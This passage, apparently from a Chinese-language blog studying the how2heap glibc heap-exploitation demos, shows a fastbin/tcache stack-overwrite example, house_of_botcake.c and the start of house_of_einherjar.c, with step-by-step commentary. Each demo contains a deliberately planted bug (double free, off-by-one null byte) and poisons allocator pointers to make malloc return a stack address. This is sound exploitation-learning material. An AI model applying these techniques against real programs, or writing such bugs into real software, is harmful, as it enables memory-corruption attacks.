  <span class="token function">memset</span><span class="token punctuation">(</span>stack_var<span class="token punctuation">,</span> <span class="token number">0xcd</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>stack_var<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">printf</span><span class="token punctuation">(</span>
    <span class="token string">"The stack address that we intend to target: %p\n"</span>
    <span class="token string">"It's current value is %p\n"</span><span class="token punctuation">,</span>
    <span class="token operator">&amp;</span>stack_var<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
    <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span>stack_var<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>
  <span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">printf</span><span class="token punctuation">(</span>
    <span class="token string">"Now we use a vulnerability such as a buffer overflow or a use-after-free\n"</span>
    <span class="token string">"to overwrite the next pointer at address %p\n\n"</span><span class="token punctuation">,</span>
    victim
  <span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token comment">//------------VULNERABILITY-----------</span>

  <span class="token comment">// Overwrite linked list pointer in victim.</span>
  <span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span>victim <span class="token operator">=</span> <span class="token operator">&amp;</span>stack_var<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

  <span class="token comment">//------------------------------------</span>

  <span class="token function">printf</span><span class="token punctuation">(</span>
    <span class="token string">"The next step is to malloc(allocsize) 7 times to empty the tcache.\n\n"</span>
  <span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token comment">// Empty tcache.</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">7</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    ptrs<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>allocsize<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>

  <span class="token function">printf</span><span class="token punctuation">(</span>
    <span class="token string">"Let's just print the contents of our array on the stack now,\n"</span>
    <span class="token string">"to show that it hasn't been modified yet.\n\n"</span>
  <span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">6</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%p: %p\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>stack_var<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span>stack_var<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>

  <span class="token function">printf</span><span class="token punctuation">(</span>
    <span class="token string">"\n"</span>
    <span class="token string">"The next allocation triggers the stack to be overwritten. The tcache\n"</span>
    <span class="token string">"is empty, but the fastbin isn't, so the next allocation comes from the\n"</span>
    <span class="token string">"fastbin. Also, 7 chunks from the fastbin are used to refill the tcache.\n"</span>
    <span class="token string">"Those 7 chunks are copied in reverse order into the tcache, so the stack\n"</span>
    <span class="token string">"address that we are targeting ends up being the first chunk in the tcache.\n"</span>
    <span class="token string">"It contains a pointer to the next chunk in the list, which is why a heap\n"</span>
    <span class="token string">"pointer is written to the stack.\n"</span>
    <span class="token string">"\n"</span>
    <span class="token string">"Earlier we said that the attack will also work if we free fewer than 6\n"</span>
    <span class="token string">"extra pointers to the fastbin, but only if the value on the stack is zero.\n"</span>
    <span class="token string">"That's because the value on the stack is treated as a next pointer in the\n"</span>
    <span class="token string">"linked list and it will trigger a crash if it isn't a valid pointer or null.\n"</span>
    <span class="token string">"\n"</span>
    <span class="token string">"The contents of our array on the stack now look like this:\n\n"</span>
  <span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">malloc</span><span class="token punctuation">(</span>allocsize<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">6</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%p: %p\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>stack_var<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span>stack_var<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>

  <span class="token keyword">char</span> <span class="token operator">*</span>q <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>allocsize<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span>
    <span class="token string">"\n"</span>
    <span class="token string">"Finally, if we malloc one more time then we get the stack address back: %p\n"</span><span class="token punctuation">,</span>
    q
  <span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">assert</span><span class="token punctuation">(</span>q <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>stack_var<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>申请14个chunk，释放，前7个进入tcache：</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220623163242917.png"></p>
<p>释放chunk7进入fastbin：</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220623163429586.png"></p>
<p>释放剩余chunk进入fastbin：</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220623164006233.png"></p>
<p>将chunk7的fd指针修改为目标地址：</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220623164213434.png"></p>
<p>将tcache中chunk申请出来</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220623164319299.png"></p>
<p>此时再申请一个chunk：</p>
<p>_int_malloc从tcache找，没有chunk，从fastbin寻找，找到了匹配的chunk，记录该chunk，等待后续返回&#x3D;&#x3D;》</p>
<p>发现fastbin后还有chunk，从头指针开始弹出chunk至tcache头指针&#x3D;&#x3D;》形成倒序                                                                                                                         </p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220623164458486.png"></p>
<p>再申请一个chunk就获得目标地址</p>
<h3 id="house-of-botcake-c"><a href="#house-of-botcake-c" class="headerlink" title="house_of_botcake.c"></a>house_of_botcake.c</h3><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdint.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;assert.h></span></span>


<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token comment">/*
     * This attack should bypass the restriction introduced in
     * https://sourceware.org/git/?p=glibc.git;a=commit;h=bcdaad21d4635931d1bd3b54a7894276925d081d
     * If the libc does not include the restriction, you can simply double free the victim and do a
     * simple tcache poisoning
     * And thanks to @anton00b and @subwire for the weird name of this technique */</span>

    <span class="token comment">// disable buffering so _IO_FILE does not interfere with our heap</span>
    <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// introduction</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"This file demonstrates a powerful tcache poisoning attack by tricking malloc into"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"returning a pointer to an arbitrary location (in this demo, the stack)."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"This attack only relies on double free.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// prepare the target</span>
    <span class="token class-name">intptr_t</span> stack_var<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"The address we want malloc() to return, namely,"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"the target address is %p.\n\n"</span><span class="token punctuation">,</span> stack_var<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// prepare heap layout</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Preparing heap layout"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Allocating 7 chunks(malloc(0x100)) for us to fill up tcache list later."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">intptr_t</span> <span class="token operator">*</span>x<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token operator">/</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token class-name">intptr_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        x<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Allocating a chunk for later consolidation"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">intptr_t</span> <span class="token operator">*</span>prev <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Allocating the victim chunk."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">intptr_t</span> <span class="token operator">*</span>a <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"malloc(0x100): a=%p.\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Allocating a padding to prevent consolidation.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    <span class="token comment">// cause chunk overlapping</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Now we are able to cause chunk overlapping"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Step 1: fill up tcache list"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">7</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token function">free</span><span class="token punctuation">(</span>x<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Step 2: free the victim chunk so it will be added to unsorted bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">free</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Step 3: free the previous chunk and make it consolidate with the victim chunk."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">free</span><span class="token punctuation">(</span>prev<span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Step 4: add the victim chunk to tcache list by taking one out from it and free victim again\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">/*VULNERABILITY*/</span>
    <span class="token function">free</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// a is already freed</span>
    <span class="token comment">/*VULNERABILITY*/</span>
    
    <span class="token comment">// simple tcache poisoning</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Launch tcache poisoning"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Now the victim is contained in a larger freed chunk, we can do a simple tcache poisoning by using overlapped chunk"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">intptr_t</span> <span class="token operator">*</span>b <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x120</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"We simply overwrite victim's fwd pointer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    b<span class="token punctuation">[</span><span class="token number">0x120</span><span class="token operator">/</span><span class="token number">8</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span>stack_var<span class="token punctuation">;</span>
    
    <span class="token comment">// take target out</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Now we can cash out the target chunk."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">intptr_t</span> <span class="token operator">*</span>c <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"The new chunk is at %p\n"</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    <span class="token comment">// sanity check</span>
    <span class="token function">assert</span><span class="token punctuation">(</span>c<span class="token operator">==</span>stack_var<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Got control on target/stack!\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    <span class="token comment">// note</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Note:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"And the wonderful thing about this exploitation is that: you can free b, victim again and modify the fwd pointer of victim"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"In that case, once you have done this exploitation, you can have many arbitary writes very easily."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>申请9个0x110的chunk，申请一个0x20的小chunk，防止合并：</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220624162101308.png"></p>
<p>释放前7个chunk至tcache，释放第9个chunk。再释放第8个chunk：</p>
<p>8，9chunk触发合并</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220624162331822.png"></p>
<p>申请一个chunk，从tcache中得来：</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220624162614713.png"></p>
<p>再次释放第9个chunk：</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220624162646082.png"></p>
<p>第9个chunk成功进入tcache，触发了double free</p>
<p>再从unsorted bin中切割一个chunk出来&#x3D;&#x3D;》该chunk可以控制tcache中的第9个chunk</p>
<p>&#x3D;&#x3D;》通过刚刚申请的chunk将第9个chunk的fd指针修改为目标栈地址：</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220624163030080.png"></p>
<p>再malloc两次即可获得目标地址</p>
<h3 id="house-of-einherjar-c"><a href="#house-of-einherjar-c" class="headerlink" title="house_of_einherjar.c"></a>house_of_einherjar.c</h3><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdint.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;malloc.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;assert.h></span></span>

<span class="token comment">/*
   Credit to st4g3r for publishing this technique
   The House of Einherjar uses an off-by-one overflow with a null byte to control the pointers returned by malloc()
   This technique may result in a more powerful primitive than the Poison Null Byte, but it has the additional requirement of a heap leak. 
*/</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	<span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Welcome to House of Einherjar!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Tested in Ubuntu 18.04.4 64bit.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"This technique only works with disabled tcache-option for glibc or with size of b larger than 0x408, see build_glibc.sh for build instructions.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"This technique can be used when you have an off-by-one into a malloc'ed region with a null byte.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token class-name">uint8_t</span><span class="token operator">*</span> a<span class="token punctuation">;</span>
	<span class="token class-name">uint8_t</span><span class="token operator">*</span> b<span class="token punctuation">;</span>
	<span class="token class-name">uint8_t</span><span class="token operator">*</span> d<span class="token punctuation">;</span>

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nWe allocate 0x38 bytes for 'a'\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	a <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">uint8_t</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x38</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"a: %p\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>
   
	<span class="token keyword">int</span> real_a_size <span class="token operator">=</span> <span class="token function">malloc_usable_size</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Since we want to overflow 'a', we need the 'real' size of 'a' after rounding: %#x\n"</span><span class="token punctuation">,</span> real_a_size<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// create a fake chunk</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nWe create a fake chunk wherever we want, in this case we'll create the chunk on the stack\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"However, you can also create the chunk in the heap or the bss, as long as you know its address\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"We set our fwd and bck pointers to point at the fake_chunk in order to pass the unlink checks\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"(although we could do the unsafe unlink technique here in some scenarios)\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token class-name">size_t</span> fake_chunk<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

	fake_chunk<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x100</span><span class="token punctuation">;</span> <span class="token comment">// prev_size is now used and must equal fake_chunk's size to pass P->bk->size == P->prev_size</span>
	fake_chunk<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x100</span><span class="token punctuation">;</span> <span class="token comment">// size of the chunk just needs to be small enough to stay in the small bin</span>
	fake_chunk<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span> fake_chunk<span class="token punctuation">;</span> <span class="token comment">// fwd</span>
	fake_chunk<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span> fake_chunk<span class="token punctuation">;</span> <span class="token comment">// bck</span>
	fake_chunk<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span> fake_chunk<span class="token punctuation">;</span> <span class="token comment">//fwd_nextsize</span>
	fake_chunk<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span> fake_chunk<span class="token punctuation">;</span> <span class="token comment">//bck_nextsize</span>


	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Our fake chunk at %p looks like:\n"</span><span class="token punctuation">,</span> fake_chunk<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"prev_size (not used): %#lx\n"</span><span class="token punctuation">,</span> fake_chunk<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"size: %#lx\n"</span><span class="token punctuation">,</span> fake_chunk<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fwd: %#lx\n"</span><span class="token punctuation">,</span> fake_chunk<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"bck: %#lx\n"</span><span class="token punctuation">,</span> fake_chunk<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fwd_nextsize: %#lx\n"</span><span class="token punctuation">,</span> fake_chunk<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"bck_nextsize: %#lx\n"</span><span class="token punctuation">,</span> fake_chunk<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">/* In this case it is easier if the chunk size attribute has a least significant byte with
	 * a value of 0x00. The least significant byte of this will be 0x00, because the size of 
	 * the chunk includes the amount requested plus some amount required for the metadata. */</span>
	b <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">uint8_t</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x4f8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">int</span> real_b_size <span class="token operator">=</span> <span class="token function">malloc_usable_size</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nWe allocate 0x4f8 bytes for 'b'.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"b: %p\n"</span><span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token class-name">uint64_t</span><span class="token operator">*</span> b_size_ptr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>b <span class="token operator">-</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token comment">/* This technique works by overwriting the size metadata of an allocated chunk as well as the prev_inuse bit*/</span>

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nb.size: %#lx\n"</span><span class="token punctuation">,</span> <span class="token operator">*</span>b_size_ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"b.size is: (0x500) | prev_inuse = 0x501\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"We overflow 'a' with a single null byte into the metadata of 'b'\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token comment">/* VULNERABILITY */</span>
	a<span class="token punctuation">[</span>real_a_size<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> 
	<span class="token comment">/* VULNERABILITY */</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"b.size: %#lx\n"</span><span class="token punctuation">,</span> <span class="token operator">*</span>b_size_ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"This is easiest if b.size is a multiple of 0x100 so you "</span>
		   <span class="token string">"don't change the size of b, only its prev_inuse bit\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"If it had been modified, we would need a fake chunk inside "</span>
		   <span class="token string">"b where it will try to consolidate the next chunk\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// Write a fake prev_size to the end of a</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nWe write a fake prev_size to the last %lu bytes of a so that "</span>
		   <span class="token string">"it will consolidate with our fake chunk\n"</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
